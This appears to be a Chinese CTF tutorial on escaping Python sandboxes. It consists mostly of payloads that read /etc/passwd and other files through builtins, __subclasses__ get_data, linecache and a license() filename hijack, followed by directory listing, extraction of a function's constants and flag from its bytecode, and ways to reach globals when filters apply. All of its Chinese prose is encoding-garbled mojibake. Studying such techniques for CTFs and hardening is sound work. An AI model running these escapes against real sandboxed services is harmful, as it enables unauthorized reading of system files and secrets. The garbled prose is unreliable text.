<h2 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h2><h3 id="file-ç±»"><a href="#file-ç±»" class="headerlink" title="file ç±»"></a>file ç±»</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šè¯¥å‡½æ•°åªå­˜åœ¨äºPython2ï¼ŒPython3ä¸å­˜åœ¨</span></span><br></pre></td></tr></table></figure></div>

<h3 id="open-å‡½æ•°"><a href="#open-å‡½æ•°" class="headerlink" title="open å‡½æ•°"></a>open å‡½æ•°</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="codecs-æ¨¡å—"><a href="#codecs-æ¨¡å—" class="headerlink" title="codecs æ¨¡å—"></a>codecs æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="get-data-å‡½æ•°"><a href="#get-data-å‡½æ•°" class="headerlink" title="get_data å‡½æ•°"></a>get_data å‡½æ•°</h3><p>FileLoader ç±»</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader.get_data(0,&lt;filename&gt;)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ç›¸æ¯”äºè·å– <code>__builtins__</code> å†ä½¿ç”¨ open å»è¿›è¡Œè¯»å–,ä½¿ç”¨ get_data çš„ payload æ›´çŸ­.</p>
<h3 id="linecache-æ¨¡å—"><a href="#linecache-æ¨¡å—" class="headerlink" title="linecache æ¨¡å—"></a>linecache æ¨¡å—</h3><p>getlines å‡½æ•°</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> linecache</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>getline å‡½æ•°éœ€è¦ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¡Œå·</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getline(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="license-å‡½æ•°"><a href="#license-å‡½æ•°" class="headerlink" title="license å‡½æ•°"></a>license å‡½æ•°</h3><p>åœ¨ Python é‡Œï¼Œ<code>license</code> ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¸€ä¸ªç‰¹æ®Šå¯¹è±¡ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(license)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>å®ƒæ˜¯ <code>_sitebuiltins._Printer</code> ç±»çš„å®ä¾‹ï¼Œå¹³æ—¶ä½ ç›´æ¥è¾“å…¥ <code>license()</code>ï¼Œå®ƒä¼šæ‰“å° Python License ä¿¡æ¯ã€‚</p>
<p>è¿™ä¸ª <code>_Printer</code> ç±»çš„æ ¸å¿ƒé€»è¾‘ä¸ºï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.license._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.10/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ul>
<li>å®ƒå†…éƒ¨æœ‰ä¸€ä¸ª <code>_Printer__filenames</code> åˆ—è¡¨ï¼Œé‡Œé¢æ˜¯è¦æ˜¾ç¤ºçš„æ–‡ä»¶è·¯å¾„ï¼ˆé€šå¸¸æ˜¯ Python è‡ªå¸¦çš„ LICENSE æ–‡æœ¬ï¼‰ã€‚</li>
<li>è°ƒç”¨è¿™ä¸ªå¯¹è±¡æ—¶ï¼ˆ<code>license()</code>ï¼‰ï¼Œå®ƒä¼šæŒ‰ <code>_Printer__filenames</code> é‡Œçš„è·¯å¾„è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºã€‚</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ <code>_Printer__filenames</code> æ–‡ä»¶åˆ—è¡¨å°±èƒ½ä»»æ„è¯»ï¼Œä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames = [<span class="string">&quot;/etc/passwd&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœæ‰§è¡Œ <code>license()</code>ï¼Œå®ƒå°±ä¼šæ‰“å¼€ <code>/etc/passwd</code> å¹¶æ‰“å°å‡ºæ¥ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">license()  <span class="comment"># ä¼šæ‰“å° /etc/passwd</span></span><br></pre></td></tr></table></figure></div>

<h2 id="æšä¸¾ç›®å½•"><a href="#æšä¸¾ç›®å½•" class="headerlink" title="æšä¸¾ç›®å½•"></a>æšä¸¾ç›®å½•</h2><h3 id="os-æ¨¡å—-1"><a href="#os-æ¨¡å—-1" class="headerlink" title="os æ¨¡å—"></a>os æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="glob-æ¨¡å—"><a href="#glob-æ¨¡å—" class="headerlink" title="glob æ¨¡å—"></a>glob æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>) </span><br></pre></td></tr></table></figure></div>

<h2 id="è·å–å‡½æ•°ä¿¡æ¯"><a href="#è·å–å‡½æ•°ä¿¡æ¯" class="headerlink" title="è·å–å‡½æ•°ä¿¡æ¯"></a>è·å–å‡½æ•°ä¿¡æ¯</h2><p>python ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>__code__</code> å±æ€§.è¿™ä¸ª<code>__code__</code> å±æ€§å°±æ˜¯ä¸Šé¢çš„ä»£ç å¯¹è±¡ï¼Œå­˜æ”¾äº†å¤§é‡æœ‰å…³äºè¯¥å‡½æ•°çš„ä¿¡æ¯.</p>
<p>å‡è®¾ä¸Šä¸‹æ–‡å­˜åœ¨ä¸€ä¸ªå‡½æ•°</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;THIS-IS-THE-FALG!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><code>__code__</code> å±æ€§åŒ…å«äº†è¯¸å¤šå­å±æ€§,è¿™äº›å­å±æ€§ç”¨äºæè¿°å‡½æ•°çš„å­—èŠ‚ç å¯¹è±¡,ä¸‹é¢æ˜¯å¯¹è¿™äº›å±æ€§çš„è§£é‡Šï¼š</p>
<ul>
<li><code>co_argcount</code>: å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œä¸åŒ…æ‹¬å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚</li>
<li><code>co_cellvars</code>: å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„é—­åŒ…å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li>
<li><code>co_code</code>: å‡½æ•°çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ï¼Œä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚</li>
<li><code>co_consts</code>: å‡½æ•°ä¸­ä½¿ç”¨çš„å¸¸é‡çš„å…ƒç»„ï¼ŒåŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ç­‰ã€‚</li>
<li><code>co_exceptiontable</code>: å¼‚å¸¸å¤„ç†è¡¨ï¼Œç”¨äºæè¿°å‡½æ•°ä¸­çš„å¼‚å¸¸å¤„ç†ã€‚</li>
<li><code>co_filename</code>: å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶åã€‚</li>
<li><code>co_firstlineno</code>: å‡½æ•°å®šä¹‰çš„ç¬¬ä¸€è¡Œæ‰€åœ¨çš„è¡Œå·ã€‚</li>
<li><code>co_flags</code>: å‡½æ•°çš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºå‡½æ•°çš„å±æ€§å’Œç‰¹å¾ï¼Œå¦‚æ˜¯å¦æœ‰é»˜è®¤å‚æ•°ã€æ˜¯å¦æ˜¯ç”Ÿæˆå™¨å‡½æ•°ç­‰ã€‚</li>
<li><code>co_freevars</code>: å‡½æ•°ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡çš„åç§°åˆ—è¡¨ï¼Œè‡ªç”±å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰ä½†åœ¨å‡½æ•°å†…éƒ¨è¢«å¼•ç”¨çš„å˜é‡ã€‚</li>
<li><code>co_kwonlyargcount</code>: å‡½æ•°çš„å…³é”®å­—å‚æ•°æ•°é‡ã€‚</li>
<li><code>co_lines</code>: å‡½æ•°çš„æºä»£ç è¡Œåˆ—è¡¨ã€‚</li>
<li><code>co_linetable</code>: å‡½æ•°çš„è¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„è¡¨ã€‚</li>
<li><code>co_lnotab</code>: è¡¨ç¤ºè¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„å…³ç³»çš„å­—ç¬¦ä¸²ã€‚</li>
<li><code>co_name</code>: å‡½æ•°çš„åç§°ã€‚</li>
<li><code>co_names</code>: å‡½æ•°ä¸­ä½¿ç”¨çš„å…¨å±€å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li>
<li><code>co_nlocals</code>: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„æ•°é‡ã€‚</li>
<li><code>co_positions</code>: å‡½æ•°ä¸­ä¸ä½ç½®ç›¸å…³çš„å˜é‡ï¼ˆæ¯”å¦‚é—­åŒ…ä¸­çš„è‡ªç”±å˜é‡ï¼‰çš„åç§°åˆ—è¡¨ã€‚</li>
<li><code>co_posonlyargcount</code>: å‡½æ•°çš„ä»…ä½ç½®å‚æ•°æ•°é‡ã€‚</li>
<li><code>co_qualname</code>: å‡½æ•°çš„é™å®šåç§°ï¼ŒåŒ…å«äº†å‡½æ•°æ‰€åœ¨çš„æ¨¡å—å’Œç±»åã€‚</li>
<li><code>co_stacksize</code>: å‡½æ•°çš„å †æ ˆå¤§å°ï¼Œè¡¨ç¤ºå‡½æ•°æ‰§è¡Œæ—¶æ‰€éœ€çš„å †æ ˆç©ºé—´ã€‚</li>
<li><code>co_varnames</code>: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€äº›ä½¿ç”¨ç¤ºä¾‹:</p>
<h3 id="è·å–æºä»£ç ä¸­çš„å¸¸é‡"><a href="#è·å–æºä»£ç ä¸­çš„å¸¸é‡" class="headerlink" title="è·å–æºä»£ç ä¸­çš„å¸¸é‡"></a>è·å–æºä»£ç ä¸­çš„å¸¸é‡</h3><p>å¯ä»¥ä½¿ç”¨ <code>__code__.co_consts</code> è¿™ç§æ–¹æ³•è¿›è¡Œè·å–, co_consts å¯ä»¥è·å–å¸¸é‡.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="number">1</span>, <span class="string">&#x27;secretcode&#x27;</span>, <span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>, <span class="string">&#x27;Nope&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–å˜é‡"><a href="#è·å–å˜é‡" class="headerlink" title="è·å–å˜é‡"></a>è·å–å˜é‡</h3><p>åˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ payload è·å– get_flag å‡½æ•°ä¸­çš„å˜é‡ä¿¡æ¯</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br><span class="line"></span><br><span class="line">get_flag.__globals__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_varnames</span><br><span class="line">(<span class="string">&#x27;some_input&#x27;</span>, <span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;var2&#x27;</span>, <span class="string">&#x27;var3&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—"><a href="#è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—" class="headerlink" title="è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—"></a>è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—</h3><p>get_flag å‡½æ•°çš„ <code>.__code__.co_code</code>, å¯ä»¥è·å–åˆ°å‡½æ•°çš„å­—èŠ‚ç åºåˆ—:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>å­—èŠ‚ç å¹¶ä¸åŒ…å«æºä»£ç çš„å®Œæ•´ä¿¡æ¯ï¼Œå¦‚å˜é‡åã€æ³¨é‡Šç­‰ã€‚ä½†å¯ä»¥ä½¿ç”¨ dis æ¨¡å—æ¥åæ±‡ç¼–å­—èŠ‚ç å¹¶è·å–å¤§è‡´çš„æºä»£ç .</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__.co_code</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(bytecode)</span><br><span class="line">          <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line">          <span class="number">2</span> LOAD_CONST               <span class="number">1</span></span><br><span class="line">          <span class="number">4</span> STORE_FAST               <span class="number">1</span></span><br><span class="line">          <span class="number">6</span> LOAD_CONST               <span class="number">2</span></span><br><span class="line">          <span class="number">8</span> STORE_FAST               <span class="number">2</span></span><br><span class="line">         <span class="number">10</span> LOAD_CONST               <span class="number">3</span></span><br><span class="line">         <span class="number">12</span> LOAD_CONST               <span class="number">4</span></span><br><span class="line">         <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">         <span class="number">16</span> STORE_FAST               <span class="number">3</span></span><br><span class="line">         <span class="number">18</span> LOAD_FAST                <span class="number">0</span></span><br><span class="line">         <span class="number">20</span> LOAD_FAST                <span class="number">2</span></span><br><span class="line">         <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">         <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line">         <span class="number">30</span> LOAD_CONST               <span class="number">5</span></span><br><span class="line">         <span class="number">32</span> RETURN_VALUE</span><br><span class="line">    &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span></span><br><span class="line">         <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></div>

<p>è™½ç„¶èƒ½è·å–ä½†ä¸å¤ªæ–¹ä¾¿çœ‹,å¦‚æœèƒ½å¤Ÿè·å– <code>__code__</code> å¯¹è±¡,ä¹Ÿå¯ä»¥é€šè¿‡ <code>dis.disassemble</code> è·å–æ›´æ¸…æ™°çš„è¡¨ç¤º.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble(bytecode)</span><br><span class="line">  <span class="number">1</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">4</span> STORE_FAST               <span class="number">1</span> (var1)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;secretcode&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> STORE_FAST               <span class="number">2</span> (var2)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">10</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;some&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;array&#x27;</span>)</span><br><span class="line">             <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">16</span> STORE_FAST               <span class="number">3</span> (var3)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_FAST                <span class="number">0</span> (some_input)</span><br><span class="line">             <span class="number">20</span> LOAD_FAST                <span class="number">2</span> (var2)</span><br><span class="line">             <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">             <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">30</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>)</span><br><span class="line">             <span class="number">32</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>     &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;Nope&#x27;</span>)</span><br><span class="line">             <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></div>

<h2 id="è·å–ç¯å¢ƒä¿¡æ¯"><a href="#è·å–ç¯å¢ƒä¿¡æ¯" class="headerlink" title="è·å–ç¯å¢ƒä¿¡æ¯"></a>è·å–ç¯å¢ƒä¿¡æ¯</h2><h3 id="è·å–-python-ç‰ˆæœ¬"><a href="#è·å–-python-ç‰ˆæœ¬" class="headerlink" title="è·å– python ç‰ˆæœ¬"></a>è·å– python ç‰ˆæœ¬</h3><h4 id="sys-æ¨¡å—"><a href="#sys-æ¨¡å—" class="headerlink" title="sys æ¨¡å—"></a>sys æ¨¡å—</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure></div>

<h4 id="platform-æ¨¡å—-1"><a href="#platform-æ¨¡å—-1" class="headerlink" title="platform æ¨¡å—"></a>platform æ¨¡å—</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–-linux-ç‰ˆæœ¬"><a href="#è·å–-linux-ç‰ˆæœ¬" class="headerlink" title="è·å– linux ç‰ˆæœ¬"></a>è·å– linux ç‰ˆæœ¬</h3><h4 id="platform-æ¨¡å—-2"><a href="#platform-æ¨¡å—-2" class="headerlink" title="platform æ¨¡å—"></a>platform æ¨¡å—</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–è·¯å¾„"><a href="#è·å–è·¯å¾„" class="headerlink" title="è·å–è·¯å¾„"></a>è·å–è·¯å¾„</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure></div>

<h2 id="è·å–å…¨å±€å˜é‡"><a href="#è·å–å…¨å±€å˜é‡" class="headerlink" title="è·å–å…¨å±€å˜é‡"></a>è·å–å…¨å±€å˜é‡</h2><h3 id="globals-å‡½æ•°"><a href="#globals-å‡½æ•°" class="headerlink" title="globals å‡½æ•°"></a>globals å‡½æ•°</h3><p>globals å‡½æ•°å¯ä»¥è·å–æ‰€æœ‰çš„å…¨å±€å˜é‡ã€‚</p>
<h3 id="help-å‡½æ•°"><a href="#help-å‡½æ•°" class="headerlink" title="help å‡½æ•°"></a>help å‡½æ•°</h3><p>help å‡½æ•°ä¹Ÿå¯ä»¥è·å–æŸä¸ªæ¨¡å—çš„å¸®åŠ©ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡, è¾“å…¥ <code>__main__</code> ä¹‹åå¯ä»¥è·å–å½“å‰æ¨¡å—çš„ä¿¡æ¯ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; __main__</span><br></pre></td></tr></table></figure></div>

<p>ç›¸æ¯” globals() è€Œè¨€ help() æ›´çŸ­ï¼Œåœ¨ä¸€äº›é™åˆ¶é•¿åº¦çš„é¢˜ç›®ä¸­æœ‰åˆ©ç”¨è¿‡è¿™ä¸ªç‚¹ã€‚</p>
<h3 id="vars-å‡½æ•°"><a href="#vars-å‡½æ•°" class="headerlink" title="vars å‡½æ•°"></a>vars å‡½æ•°</h3><p>vars() å‡½æ•°è¿”å›è¯¥å¯¹è±¡çš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¸­çš„æ‰€æœ‰å±æ€§ä»¥å­—å…¸çš„å½¢å¼è¡¨ç¤ºã€‚å½“å‰æ¨¡å—çš„æ‰€æœ‰å˜é‡ä¹Ÿä¼šåŒ…å«åœ¨é‡Œé¢ï¼Œä¸€äº›è¿‡æ»¤é“¾ globals å’Œ help å‡½æ•°çš„åœºæ™¯å¯ä»¥å°è¯•ä½¿ç”¨ vars()</p>
